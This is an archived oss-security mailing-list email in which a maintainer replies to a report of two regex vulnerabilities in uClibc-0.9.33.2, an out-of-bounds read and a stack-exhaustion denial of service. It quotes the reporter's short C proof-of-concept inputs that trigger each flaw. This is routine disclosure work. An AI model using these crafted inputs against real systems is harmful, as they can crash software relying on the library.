X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["2011" "Friday" "16" "June" "2017" "15:12:46" "+0200" "Peter Korsgaard" "peter@korsgaard.com" "<8760fwhy9d.fsf@dell.be.48ers.dk>" "71" "Re: [oss-security] two vulns in  uClibc-0.9.33.2" "^Cc:" nil nil "6" "2017061613:12:46" "[oss-security] two vulns in uClibc-0.9.33.2" (number mark "        peter@korsga Jun 16   71/2011  " thread-indent "\"Re: [oss-security] two vulns in  uClibc-0.9.33.2\"\n") "<tencent_18C312B86EA079DA42B11D83@qq.com>" ("<tencent_18C312B86EA079DA42B11D83@qq.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0001
X-Mozilla-Status2: 00000000
Received: (qmail 17898 invoked by uid 550); 16 Jun 2017 13:46:49 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 29852 invoked from network); 16 Jun 2017 13:13:01 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20161025;
        h=sender:from:to:cc:subject:references:date:in-reply-to:message-id
         :user-agent:mime-version;
        bh=VpivsViFxasAp+UEBeAEdmAVKwv7yxfkWOD42B2eA+c=;
        b=qCD2LqBicKWYo8XOF2kEuqD5vJOvdNRyKWQR5N+nKuneJUr5osgrEqh9OYd1wgmNOu
         y7gIPSejdP7lBHFUd9PPosBUzPkZ04wJkr86GHDAx/P4KiIToQzDO+8CLfmQvTkJJMid
         oZI3CzYqUQ0z7bMacYgnGPOoMalcE4vY8q2155G/nOSL/bNBN6XNXPWzG6NiP0yGxCtA
         Jw2x1OhBNEO+xlb0WJv4BrApoGLnN4tJ7n/quk/4vPmTF5tZe008eAFrc1tffSLNskM0
         VLKHZqCE1/HdF2tPKW6afCDteK6mr67FOy4vOEn+qosCL/DsDTE+QLT/lRFe6PWdbKAS
         g+Iw==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20161025;
        h=x-gm-message-state:sender:from:to:cc:subject:references:date
         :in-reply-to:message-id:user-agent:mime-version;
        bh=VpivsViFxasAp+UEBeAEdmAVKwv7yxfkWOD42B2eA+c=;
        b=bmWMi7QS+T2WqJxiiM+KMqRLeBaEWByZgYkxCvoAIGplknp6M0WhswNlx3CWcM/r/U
         gBwbaUQ7hn7HuqNyw61ZVPXYGJ1ivZFrSnQqlnZSw+lEwhSpV8iMkg6afa6eJ1WHN17x
         PxMAozZJEmcDS29VxxzJoSxZ5cY/rAIKo6ZMuEVRVm/v8f2KYXDNJABBIah8iyHTcTUE
         nTJBZw5M6EAyDDxpRHHpE3huBU5aqHxVP+zGUcmfQa68leyVy+TN3yYrPS0KEiaKwkoE
         CufqBGgEMh0p7YHsl4hT3dk1wsJHin0WjfyjQJJf1dYyx7I1M1KwSQjD5sj6y+UtcSua
         EiAg==
X-Gm-Message-State: AKS2vOx1gTzyymwdn+hAgErLhiLQ3nHHweSP3P/WgtHKkFNSv46cLjqe
	oF9MKJAgEM2guQ==
X-Received: by 10.80.216.136 with SMTP id p8mr7486964edj.136.1497618769925;
        Fri, 16 Jun 2017 06:12:49 -0700 (PDT)
References: <tencent_18C312B86EA079DA42B11D83@qq.com>
In-Reply-To: <tencent_18C312B86EA079DA42B11D83@qq.com> (fefe's message of
	"Fri, 16 Jun 2017 11:53:09 +0800")
Message-ID: <8760fwhy9d.fsf@dell.be.48ers.dk>
User-Agent: Gnus/5.13 (Gnus v5.13) Emacs/24.5 (gnu/linux)
MIME-Version: 1.0
Content-Type: text/plain
Cc: "oss-security" <oss-security@lists.openwall.com>
Date: Fri, 16 Jun 2017 15:12:46 +0200
From: Peter Korsgaard <peter@korsgaard.com>
Reply-To: oss-security@lists.openwall.com
Sender: Peter Korsgaard <jacmet@gmail.com>
Subject: Re: [oss-security] two vulns in  uClibc-0.9.33.2
To: "fefe" <qbenjin@qq.com>, wbx@openadk.org

>>>>> "fefe" == fefe  <qbenjin@qq.com> writes:

 > I found two vulns in  uClibc-0.9.33.2 (https://uclibc.org/)

uClibc is dead. Active development happens on uClibc-ng. Is uClibc-ng
also affected by these issues?


> one is about line 2682 of get_subexp.c :

I take it you are referring to libc/misc/regex/regexec.c?


 > 		if (BE (bkref_str_off >= mctx->input.valid_len, 0))
 > 		{
 > 		  /* If we are at the end of the input, we cannot match.  */
 > 		  if (bkref_str_off >= mctx->input.len)
 > 		    break;


 > 		  err = extend_buffers (mctx);
 > 		  if (BE (err != REG1_NOERROR, 0))
 > 		    return err;


 > 		  buf = (const char *) re_string_get_buffer (&mctx->input);
 > 		}
 > 	      if (buf [bkref_str_off++] != buf[sl_str - 1])
 > 		break; /* We don't need to search this sub expression
		
 > "bkref_str_off >= mctx->input.valid_len" , when  bkref_str_off == mctx->input.valid_len, "buf [bkref_str_off++] != buf[sl_str - 1]" case Out of one bit bounds read


 > The poc code like:
	
 > 	if(regcomp (&regtmp,"(.+)upper\\1^", REG_EXTENDED|REG_ICASE | REG_NOSUB )==0)
 > 	{		
 >         	reg1match_t pmatch[1];
 > 		regexec(&regtmp, "upperupperupperx",1, pmatch, 0);
 > 		regfree(&regtmp);
 > 	}


 > The another is aout line 1837 of regexce.c :


 > 		check_dst_limits_calc_pos_1 (const re_match_context_t *mctx, int boundaries,
 > 			     int subexp_idx, int from_node, int bkref_idx)
 >                 .......


 > 		  cpos =
 > 		    check_dst_limits_calc_pos_1 (mctx, boundaries, subexp_idx,
 > 						 dst, bkref_idx);


		
 > check_dst_limits_calc_pos_1 recursive calls case DDOS, because of stack exhaustion.


 > The poc code like:	
	
 > 	if(regcomp (&regtmp,"\x28\x2E\x3F\x3F\x28\x2E\x3F\x29\x5C\x42\x44\x3F\x3F\x28\x2E\x5C\x32\x29\x2A\x5C\x32\x28\x2E\x3F\x29\x5C\x32\x29\x2A\x5C\x32\xBD", REG_EXTENDED|REG_ICASE | REG_NOSUB )==0)
 > 	{		
 >         	reg1match_t pmatch[1];
 > 		regexec(&regtmp, "\x72\xFF\xFF\xFF\xFF\xBD",1, pmatch, 0);
 > 		regfree(&regtmp);
 > 	}

-- 
Bye, Peter Korsgaard
